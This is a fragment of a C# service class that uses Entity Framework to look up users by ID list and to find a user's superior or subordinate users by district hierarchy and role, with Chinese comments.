                    allUser = allUser.Where(x => userIdArr.Contains(x.ID)).ToList();
                }
                var tmp = allUser.ToList();
                foreach (var user in tmp)
                {
                    reList.Add(new TreeClass { id = user.ID.ToString(), name = string.Format("{0}({1})", user.NAME, user.fa_district.NAME) });
                }

                return reList;
            }
        }

        public IList<TreeClass> UserGetBylUserId(string loginKey, ref ErrorInfo err, string userIdStr)
        {
            using (DBEntities db = new DBEntities())
            {
                IList<TreeClass> reList = new List<TreeClass>();
                if (string.IsNullOrEmpty(userIdStr)) return reList;
                var allUserIdArr = userIdStr.Split(',').Where(x=>!string.IsNullOrEmpty(x)).Select(x => Convert.ToInt32(x)).ToList();
                var allUser = db.fa_user.Where(x => allUserIdArr.Contains(x.ID)).OrderBy(x => x.ID).ToList();
                var tmp = allUser.ToList();
                foreach (var user in tmp)
                {
                    reList.Add(new TreeClass { id = user.ID.ToString(), name = string.Format("{0}({1})", user.NAME, user.fa_district.NAME) });
                }
                return reList;
            }
        }


        /// <summary>
        /// 上级或平级
        /// </summary>
        /// <param name="loginKey"></param>
        /// <param name="err"></param>
        /// <param name="allRoleIdList"></param>
        /// <returns></returns>
        public IList<int> UserGetMasterUser(string loginKey, ref ErrorInfo err,List<int> allRoleIdList)
        {
            GlobalUser gu = Global.GetUser(loginKey);
            if (gu == null)
            {
                err.IsError = true;
                err.Message = "登录超时";
                return null;
            }
            return UserGetMasterUserById(gu.UserId, ref err, allRoleIdList);
        }

        public IList<int> UserGetMasterUserById(int userId, ref ErrorInfo err, List<int> allRoleIdList)
        {
            if (allRoleIdList == null || allRoleIdList.Count() == 0)
            {
                return new List<int>();
            }

            using (DBEntities db = new DBEntities())
            {
                //用户的所有上级用户
                var user = db.fa_user.SingleOrDefault(x => x.ID == userId);
                var allDisId = user.fa_district.ID_PATH.Split('.').Where(x => x.IsInt64()).Select(x => Convert.ToInt32(x)).ToList();
                allDisId.Add(user.DISTRICT_ID);
                var allUser = db.fa_user.Where(x => allDisId.Contains(x.DISTRICT_ID)).ToList();
                return allUser.Where(x => x.fa_role.Where(y => allRoleIdList.Contains(y.ID)).Count() > 0).Select(x => x.ID).ToList();
            }
        }

        /// <summary>
        /// 获取用户所有的上级用户和下级用户
        /// </summary>
        /// <param name="userId"></param>
        /// <param name="err"></param>
        /// <param name="allRoleIdList"></param>
        /// <param name="type">1表示所有用户，2表示只获取上级用户，3表示只获取下级用户</param>
        /// <returns></returns>
        public IList<int> UserGetAllUserById(int userId, ref ErrorInfo err, List<int> allRoleIdList,int type=1)
        {
            if (allRoleIdList == null || allRoleIdList.Count() == 0)
            {
                return new List<int>();
            }

            using (DBEntities db = new DBEntities())
            {
                //用户的所有上级用户
                var user = db.fa_user.SingleOrDefault(x => x.ID == userId);
                //用户的所有层级
                var allDisId = user.fa_district.ID_PATH.Split('.').Where(x => x.IsInt64()).Select(x => Convert.ToInt32(x)).ToList();
                allDisId.Add(user.DISTRICT_ID);
                string disStr=string.Format(".{0}.",user.DISTRICT_ID);
                //用户的所有上级，或用户的所有下级用户
                IList<fa_user> allUser = new List<fa_user>();
                switch (type)
                {
                    case 1:
                        allUser = db.fa_user.Where(x => allDisId.Contains(x.DISTRICT_ID) || x.fa_district.ID_PATH.IndexOf(disStr) > -1).ToList();
                        break;
                    case 2:
                        allUser = db.fa_user.Where(x => allDisId.Contains(x.DISTRICT_ID)).ToList();
                        break;
                    case 3:
                        allUser = db.fa_user.Where(x => x.fa_district.ID_PATH.IndexOf(disStr) > -1).ToList();
                        break;
                }
                return allUser.Where(x => x.fa_role.Where(y => allRoleIdList.Contains(y.ID)).Count() > 0).Select(x => x.ID).ToList();
            }
        }
       
    }
}
